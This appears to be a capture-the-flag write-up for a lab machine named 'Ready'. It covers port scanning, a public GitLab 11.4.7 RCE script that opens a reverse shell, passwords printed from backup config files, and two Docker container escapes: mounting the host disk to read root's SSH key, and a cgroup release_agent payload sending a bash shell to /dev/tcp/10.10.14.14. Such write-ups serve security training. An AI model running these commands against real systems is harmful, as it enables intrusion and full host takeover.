# Ready

## Machine Info

![Ready](./Ready.assets/Ready.png)

## Recon

- nmap

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- create a new user and login to check the version of **GitLab 11.4.7**

![image-20240130080112332](./Ready.assets/image-20240130080112332.png)

![image-20240130080203749](./Ready.assets/image-20240130080203749.png)

## Foothold

### GitLab 11.4.7 RCE

- https://github.com/Algafix/gitlab-RCE-11.4.7 -> bash [yes]
  - CVE-2018-19571
  - CVE-2018-19585

```console
└─╼$ python rce_script.py -u qwe -p 1q2w3e4r -g http://10.10.10.220:5080 -l 10.10.14.14 -P 1234 bash
[+] Login successful.
[+] Creating payload in bash
[+] Payload sent.
```

```console
└─╼$ sudo rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.220] 34794
bash: cannot set terminal process group (522): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$ id
uid=998(git) gid=998(git) groups=998(git)
git@gitlab:~/gitlab-rails/working$ uname -a
Linux gitlab.example.com 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation

### git -> container root

- enum backup dir

```console
╔══════════╣ Unexpected in /opt (usually empty)
total 24
drwxr-xr-x 1 root root 4096 Apr  5  2022 .
drwxr-xr-x 1 root root 4096 Apr  5  2022 ..
drwxr-xr-x 2 root root 4096 Apr  5  2022 backup
drwxr-xr-x 1 root root 4096 Apr  5  2022 gitlab
```

- enum config of docker container
  - redis password: `YG65407Bjqvv9A0a8Tm_7w`
  - smtp password: `wW59U!ZKMbG9+*#h` => also root's password

```console
git@gitlab:/opt/backup$ ls -al
total 112
drwxr-xr-x 2 root root  4096 Apr  5  2022 .
drwxr-xr-x 1 root root  4096 Apr  5  2022 ..
-rw-r--r-- 1 root root   904 Apr  5  2022 docker-compose.yml
-rw-r--r-- 1 root root 15150 Apr  5  2022 gitlab-secrets.json
-rw-r--r-- 1 root root 81492 Apr  5  2022 gitlab.rb
git@gitlab:/opt/backup$ cat docker-compose.yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
      - '/opt/user:/home/dude/'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
git@gitlab:/opt/backup$ cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```

```console
git@gitlab:/opt/backup$ cat gitlab.rb | grep -v -E '^#|^[[:space:]]*$'
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

```console
git@gitlab:/opt/backup$ su root
Password: wW59U!ZKMbG9+*#h

root@gitlab:/opt/backup# id
uid=0(root) gid=0(root) groups=0(root)
root@gitlab:/opt/backup# uname -a
Linux gitlab.example.com 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

### container root -> host root

#### method1: mount host dir

check file system disk space usage and enum mounted path

```console
root@gitlab:/mnt# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         9.3G  7.5G  1.7G  82% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda2       9.3G  7.5G  1.7G  82% /root_pass
shm              64M  772K   64M   2% /dev/shm

root@gitlab:~# ls -lh /root_pass
-rw-r--r-- 1 root root 23 Jun 29  2020 /root_pass
```

key points:

1. big fs: overlay, /dev/sda2
2. /root_pass <<< /dev/sda2

so, we can infer that `/dev/sda2` is the host disk (file system)

```console
root@gitlab:/mnt/root/.ssh# mount /dev/sda2 /mnt
root@gitlab:/mnt/root/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
...
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```

ssh to login with private key

```console
└─╼$ ssh -i id_rsa root@$IP
The authenticity of host '10.10.10.220 (10.10.10.220)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.220' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

root@ready:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ready:~# uname -a
Linux ready 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@ready:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
		...
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    ...
    inet 10.10.10.220/24 brd 10.10.10.255 scope global ens160
		...
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
		...
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
    ...
4: br-bcb73b090b3f: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
		...
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-bcb73b090b3f
    ...
6: veth0bad97f@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-bcb73b090b3f state UP group default
		...
```

#### method2: abusing cgroup

- Reference: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

- exploit procedure with bash reverse shell

```console
root@gitlab:/mnt/root/.ssh# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@gitlab:/mnt/root/.ssh# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
root@gitlab:/mnt/root/.ssh# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:/mnt/root/.ssh# touch /o; echo $t/c >$d/release_agent;printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.14/4321 0>&1"' >/c;
root@gitlab:/mnt/root/.ssh# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

```console
└─╼$ sudo rlwrap nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.220] 36130
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@ready:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ready:/# uname -a
uname -a
Linux ready 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

## Exploit Chain

port scan -> 5080 gitlab new user -> RCE -> git shell (container) -> backup dir with container's root password -> root shell (container) -> container escape

- mount host dir -> ssh private key -> ssh to login as root (host)
- abuse cgroup to execute reverse shell as host -> escape container -> root shell (host)
